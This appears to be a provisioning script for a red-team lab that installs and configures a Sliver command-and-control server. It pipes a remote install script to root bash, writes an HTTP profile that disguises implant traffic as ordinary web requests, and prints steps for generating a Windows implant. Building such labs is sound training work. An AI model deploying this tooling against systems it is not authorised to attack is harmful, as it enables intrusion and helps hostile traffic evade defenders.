#!/bin/bash
# sliver_setup.sh - Sliver C2 server installation
# Runs automatically via user_data on first boot

set -e

exec > >(tee /var/log/user-data.log)
exec 2>&1

echo "===== Sliver C2 Server Setup Started $(date) ====="

SSH_PASSWORD="${ssh_password}"
REDIRECTOR_VPC_CIDR="${redirector_vpc_cidr}"
C2_HEADER_NAME="${c2_header_name}"
C2_HEADER_VALUE="${c2_header_value}"

# Set hostname
echo "[*] Setting hostname..."
hostnamectl set-hostname sliver

# Configure /etc/hosts for lab machines
echo "[*] Configuring /etc/hosts..."
cat >> /etc/hosts << HOSTS

# redStack lab hosts
${sliver_private_ip}     sliver
${guacamole_private_ip}  guac
${mythic_private_ip}     mythic
${havoc_private_ip}      havoc
${redirector_private_ip} redirector
${windows_private_ip}    win-operator
HOSTS

# Update system
echo "[*] Updating system packages..."
apt-get update
DEBIAN_FRONTEND=noninteractive apt-get upgrade -y

# Install dependencies
echo "[*] Installing dependencies..."
apt-get install -y \
    curl \
    git \
    build-essential \
    mingw-w64 \
    ufw \
    net-tools \
    jq

# Configure SSH password authentication for Guacamole access
echo "[*] Configuring SSH authentication..."
echo "admin:$SSH_PASSWORD" | chpasswd

cat >> /etc/ssh/sshd_config << 'SSHCONF'

# Default: require SSH keys
PasswordAuthentication no
PubkeyAuthentication yes

# Allow password auth from private networks (for Guacamole access via VPC)
Match Address 172.16.0.0/12,10.0.0.0/8
    PasswordAuthentication yes
SSHCONF

systemctl restart sshd

# Configure UFW firewall
echo "[*] Configuring firewall rules..."
ufw --force reset
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp
ufw allow from $REDIRECTOR_VPC_CIDR to any port 80 proto tcp comment 'HTTP C2 from redirector'
ufw allow from $REDIRECTOR_VPC_CIDR to any port 443 proto tcp comment 'HTTPS C2 from redirector'
ufw allow 31337/tcp comment 'Sliver multiplexer'
ufw --force enable

# Install Sliver C2
echo "[*] Installing Sliver C2 framework..."
curl https://sliver.sh/install | sudo bash

# Wait for installation to complete
sleep 10

# The Sliver install script places the server binary in /root — symlink it into PATH
echo "[*] Symlinking sliver-server into /usr/local/bin..."
if [ -f /root/sliver-server ]; then
    ln -sf /root/sliver-server /usr/local/bin/sliver-server
    echo "[+] sliver-server symlinked to /usr/local/bin/sliver-server"
else
    echo "[!] WARNING: /root/sliver-server not found — install may have failed"
fi

# Verify installation
echo "[*] Verifying Sliver installation..."
which sliver-server && echo "[+] Sliver server binary found at $(which sliver-server)" || echo "[!] WARNING: Sliver binary not in PATH"

# Create HTTP C2 profile with the redirector validation header pre-configured
echo "[*] Creating redstack HTTP C2 profile..."
jq -n \
  --arg header_name "$C2_HEADER_NAME" \
  --arg header_value "$C2_HEADER_VALUE" \
  '{
    "implant_config": {
      "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      "chrome_base_version": 120,
      "nonce_query_args": "abcdefghijklmnopqrstuvwxyz",
      "url_parameters": null,
      "headers": [{"name": $header_name, "value": $header_value, "probability": 100}],
      "nonce_query_length": 1,
      "nonce_mode": "UrlParam",
      "max_files": 4,
      "min_files": 2,
      "max_paths": 4,
      "min_paths": 2,
      "max_path_length": 4,
      "min_path_length": 2,
      "extensions": ["js", "", "php"],
      "files": ["jquery.min", "bootstrap", "app", "main", "index", "script"],
      "paths": ["js", "assets", "scripts", "static", "dist"]
    },
    "server_config": {
      "random_version_headers": false,
      "headers": [{"name": "Cache-Control", "value": "no-store, no-cache, must-revalidate", "probability": 100, "method": "GET"}],
      "cookies": ["PHPSESSID"]
    }
  }' > /root/redstack-c2-profile.json
echo "[+] C2 profile written to /root/redstack-c2-profile.json"

# Create operator config generation script
cat > /root/generate_operator_config.sh << 'OPSCRIPT'
#!/bin/bash
# Generate a new operator config file for connecting to this Sliver server
# Usage: sudo ./generate_operator_config.sh <operator-name>

if [ -z "$1" ]; then
    echo "Usage: $0 <operator-name>"
    echo "Example: $0 operator1"
    exit 1
fi

OPERATOR_NAME=$1
echo "[*] Generating operator config for: $OPERATOR_NAME"
sliver-server operator --name "$OPERATOR_NAME" --lhost 0.0.0.0 --save "/root/$${OPERATOR_NAME}.cfg"
echo "[*] Config saved to /root/$${OPERATOR_NAME}.cfg"
echo "[*] Transfer this file to the operator's machine to connect"
OPSCRIPT
chmod +x /root/generate_operator_config.sh

# Create a quick-start helper script
cat > /root/sliver_quickstart.sh << 'QUICKSTART'
#!/bin/bash
echo "===== Sliver C2 Quick Start ====="
echo ""
echo "1. Start the Sliver server (if not running):"
echo "   sudo systemctl start sliver"
echo ""
echo "2. Open the Sliver console:"
echo "   sliver-server"
echo ""
echo "3. Generate an operator config:"
echo "   sudo /root/generate_operator_config.sh operator1"
echo ""
echo "4. In the Sliver console, start an HTTP listener:"
echo "   http --lhost 0.0.0.0 --lport 80"
echo ""
echo "5. Generate an implant:"
echo "   generate --http https://REDIRECTOR_DOMAIN/images/ --os windows --arch amd64 --format exe --save /tmp/implant.exe"
echo ""
echo "Current status:"
systemctl status sliver --no-pager 2>/dev/null || echo "Sliver service not found (may need manual start)"
echo ""
echo "Multiplexer port: 31337"
QUICKSTART
chmod +x /root/sliver_quickstart.sh

echo "===== Sliver C2 Server Setup Completed $(date) ====="
echo "===== Run /root/sliver_quickstart.sh for usage instructions ====="
